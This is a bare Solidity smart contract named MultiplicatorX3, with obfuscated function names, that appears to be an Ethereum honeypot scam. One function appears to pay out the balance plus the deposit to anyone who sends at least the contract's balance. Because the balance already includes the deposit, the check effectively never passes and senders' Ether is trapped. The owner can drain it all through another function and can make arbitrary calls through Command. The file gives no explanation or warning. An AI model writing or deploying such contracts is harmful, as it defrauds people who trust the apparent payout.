pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Owner = msg.sender;

    function() public payable{}

    function _0xc0e129()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address _0xe40923,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        _0xe40923.call.value(msg.value)(data);
    }

    function _0xe926cb(address _0xe40923)
    public
    payable
    {
        if(msg.value>=this.balance)
        {
            _0xe40923.transfer(this.balance+msg.value);
        }
    }
}